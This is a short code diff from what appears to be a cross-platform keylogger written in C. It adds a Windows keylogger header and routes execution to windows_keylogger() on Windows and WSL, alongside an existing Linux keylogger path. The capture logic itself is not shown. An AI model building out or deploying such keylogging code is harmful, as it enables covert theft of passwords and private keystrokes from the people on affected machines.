@@ -1,4 +1,5 @@
 #include "linux_keylogger.h"
+#include "windows_keylogger.h"
 #include <stdio.h>
 #include <string.h>
 
@@ -21,10 +22,11 @@ int is_wsl() {
 int main(int argc, char *argv[]) {
 #if defined(_WIN32)
   printf("Opening Windows keylogger\n");
-  is_wsl();
+  windows_keylogger(argc, argv);
 #elif defined(__linux__)
   if (is_wsl()) {
     printf("Opening Windows keylogger...\n");
+    windows_keylogger(argc, argv);
   } else {
     printf("Opening Linux keylogger...\n");
     linux_keylogger(argc, argv);
